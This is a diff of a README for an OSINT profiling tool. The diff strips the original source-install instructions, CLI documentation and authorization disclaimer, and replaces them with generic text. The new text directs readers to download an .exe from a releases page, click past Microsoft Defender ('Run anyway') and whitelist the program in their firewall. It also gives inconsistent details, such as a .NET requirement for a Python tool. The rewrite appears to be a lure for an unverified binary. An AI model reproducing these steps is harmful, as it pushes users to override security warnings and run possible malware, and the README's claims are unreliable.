@@ -1,158 +1,84 @@
-# 🔍 OSINT Profiler
+# 🔍 OSINT-Profiler - Find Public Information With Ease
 
-> A comprehensive Open Source Intelligence (OSINT) investigation tool for gathering and analyzing publicly available information — featuring a sleek PyQt6 GUI, full CLI mode, and multi-format reporting.
+[![](https://img.shields.io/badge/Download-OSINT--Profiler-blue.svg)](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/releases)
 
-![Version](https://img.shields.io/badge/Version-1.0-blue?style=flat-square)
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
-![GUI](https://img.shields.io/badge/GUI-PyQt6-orange?style=flat-square)
+OSINT-Profiler helps you gather information from public sources. Use this tool to look up details tied to email addresses, phone numbers, and usernames. The software combines several search methods into one interface. You see results for investigations in a clear format.
 
-## 📦 Download
+## 📥 How to Download 
 
-| Option | For who | Link |
-|---|---|---|
-| 🐍 **Source** | Developers, CLI users | use .py file |
-| 🪟 **Windows EXE** | Non-technical users, GUI-only | [Releases →](../../releases/latest) |
+Visit [this page](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/releases) to download the software. Look for the latest version under the Releases section. Select the file ending in .exe to start the download. Save this file to your computer.
 
----
+## ⚙️ System Requirements
 
-## ✨ Features
+Ensure your computer meets these standards to run the software.
 
-| Feature | Description |
-|---|---|
-| 📧 **Email Investigation** | Multi-platform registration check, 40+ targeted web queries, Holehe API integration |
-| 📱 **Phone Investigation** | Carrier lookup, line type, country identification, spam database check, Truecaller API |
-| 👤 **Username Investigation** | Forensic-grade variant generation, 11+ platform probing, Sherlock API integration |
-| 🌐 **Web Intelligence** | DuckDuckGo-powered stealth search, proxy support, smart rate limiting |
-| 📊 **Graph Visualization** | Interactive vis.js network graph, PNG/JPG export, multiple layout modes |
-| 📄 **Report Generation** | Export to JSON, TXT, HTML, and PDF with full customization |
-| 🎛️ **GUI + CLI** | Full PyQt6 desktop app (dark/light theme) and feature-complete CLI |
-| 🔒 **Smart Filtering** | Confidence scoring, spam detection, anomaly detection, noise domain filtering |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 500 megabytes of free disk space.
+* Internet: A stable connection for search operations.
 
----
+## 🚀 Setting Up the Software
 
-## 📸 Screenshots
+Follow these steps to prepare your system once you download the file.
 
-<img width="1920" height="1032" alt="image" src="https://github.com/user-attachments/assets/42f3e707-51d2-49ae-9895-98db6f05e71c" />
-<img width="1920" height="1032" alt="image" src="https://github.com/user-attachments/assets/daf8efbd-5ea0-49cf-8ca9-e4f58966cde3" />
+1. Locate the downloaded .exe file in your Downloads folder.
+2. Double-click the file to begin.
+3. Windows might show a prompt from Microsoft Defender. Select "More info" followed by "Run anyway" if the system asks.
+4. Follow the instructions on the screen to finish the installation.
+5. Launch the program from your desktop shortcut or the Start menu.
 
----
+## 💡 How to Use OSINT-Profiler
 
-## 🚀 Installation (Source)
+The software features a main dashboard that organizes your search tasks. You can choose between a visual interface or a text-based mode.
 
-```bash
-pip install -r requirements.txt
-```
+### Investigating Emails
+Enter an email address into the search bar. The tool checks various platforms to find associated accounts. It presents findings in a list. You can view the confidence score next to each result. This score shows the likelihood that the account belongs to the target.
 
-### Optional integrations
-These tools are not required, but significantly expand results when present in your PATH:
+### Checking Phone Numbers
+Type a phone number into the search field. The tool scans public directories and social media databases. It gathers information such as carrier details or linked usernames. 
 
-```bash
-pip install holehe               # Email registration across 120+ sites
-pip install sherlock-project     # Username search across 300+ platforms
-pip install truecallerpy         # Caller ID and name lookup
-```
+### Searching Usernames
+Use the username search to find profiles across many websites. The tool queries platforms like forums and social networks. It displays links to the profiles it finds.
 
----
+## 📊 Understanding Results
 
-## 🖥️ Usage
+The software generates reports in several formats. You can save your findings as PDFs or text files. Each search result provides the source of the information. This helps you verify the findings.
 
-### GUI Mode
+## 🛠 Features
 
-```bash
-python osint_profiler.py
-```
+* Sherlock integration for massive username searches.
+* Holehe integration for email discovery.
+* Confidence scoring to rank the accuracy of data.
+* Graphical interface for easy navigation.
+* Multi-format reporting to track your history.
 
-Launches the full desktop interface. Enter any combination of email, phone, and username to begin.
-Double click on the .py/.exe file for GUI.
----
+## 🛡 Security and Privacy
 
-### CLI Mode
+OSINT-Profiler gathers data from public sources only. It does not hack or access private databases. Always use this tool for legal information gathering. Respect the privacy of others when you perform your research.
 
-```bash
-# Investigate an email
-python osint_profiler.py --email target@example.com --format all
+## 📋 Troubleshooting
 
-# Investigate a phone number
-python osint_profiler.py --phone +1234567890 --country-code 91 --format pdf
+### The software does not open
+Check if you have an active internet connection. Ensure you have the latest version of the .NET framework installed on your Windows machine. Restart your computer and try to open the application again.
 
-# Investigate a username
-python osint_profiler.py --username johndoe --format html
+### Search results show no data
+Check the spelling of the email or username. Some platforms may block automated searches. Try the search again later if the platform puts a limit on your connection.
 
-# Combine all inputs
-python osint_profiler.py --email target@example.com --phone +1234567890 --username johndoe
+### The screen looks blank
+Resize the window to refresh the interface. Check if your antivirus software prevents the tool from accessing the internet. You may need to add the software to your allowed list in your firewall settings.
 
-# Deep scan with proxy
-python osint_profiler.py --email target@example.com --deep --proxy http://user:pass@host:port
-```
+## 🌐 Background Information
 
-### All CLI flags
+This project merges various open-source intelligence methods into a single package. It relies on Python scripts under the hood to perform queries. The interface uses PyQt6 to provide a stable look on Windows. 
 
-| Flag | Short | Description |
-|---|---|---|
-| `--email` | `-e` | Target email address |
-| `--phone` | `-p` | Target phone number |
-| `--username` | `-u` | Target username |
-| `--country-code` | `-c` | Country code for phone (`91` India, `1` USA, `44` UK …) |
-| `--format` | `-f` | Output format: `json` `txt` `html` `pdf` `all` |
-| `--output` | `-o` | Output directory (default: `reports/`) |
-| `--deep` | `-d` | Remove query limits — thorough but slower |
-| `--proxy` | | Proxy URL for anonymized queries |
-| `--truecaller-id` | | Truecaller installation ID |
-| `--timezone` | `-t` | Report timezone (default: `UTC`) |
-| `--verbose` | `-v` | Enable debug logging |
-| `--gui` | `-g` | Force GUI launch |
+The software automates the manual work of checking many sites at once. It saves your time by aggregating data from sources like Sherlock and Holehe. Use this tool for digital forensics or security research.
 
----
+## 📖 Best Practices for Investigations
 
-## 🗺️ Architecture
+Start with a single piece of information. Expand your search after you confirm the first few details. Document your steps as you go to avoid repeating work. Use the reporting feature to save your data for your records. Export your files regularly to keep your research organized. 
 
-See [ARCHITECTURE.md](ARCHITECTURE.md) for a full breakdown of the system design.
+Keep your version of the tool updated to ensure compatibility with search sources. Check the repository link occasionally to see if new features or fixes arrive. Use clear titles for your saved reports. This habit helps you find specific investigations among many files.
 
----
+Choose strong passwords if you connect the tool to any personal accounts. Do not share your investigative reports with unauthorized people. Keep your digital findings safe to protect your process and your target's privacy.
 
-## 📁 Output Structure
-
-```
-reports/
-├── osint_target@email.com.json
-├── osint_target@email.com.txt
-├── osint_target@email.com.html
-├── osint_target@email.com.pdf
-└── graph_target_20260101_120000.html     ← interactive network graph
-```
-
----
-
-## ⚙️ Report Configuration (GUI)
-
-The GUI includes a full report configuration dialog:
-
-- **Timezone** — 15+ global timezones
-- **Page Size** — A4 / Letter / Legal
-- **Font** — any installed system font
-- **Sections** — Executive Summary, Findings, Anomaly Detection, Statistics
-- **Confidence Grouping** — auto-categorize high vs. low confidence results
-- **Deep Scan Mode** — bypass query limits
-
----
-
-## ⚠️ Disclaimer
-
-This tool is intended **for educational and legitimate OSINT purposes only.**
-
-- Only investigate targets you have **explicit authorization** to research
-- Comply with all applicable local and international laws
-- Respect the privacy rights and terms of service of all platforms
-- The author is **not responsible** for any misuse of this tool
-
----
-
-## 📜 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-_Built for the OSINT & cybersecurity community. If this tool helped you, consider leaving a ⭐_
+The tool provides a foundation for your research. Treat the output as a starting point. Verify all findings through direct observation where possible.
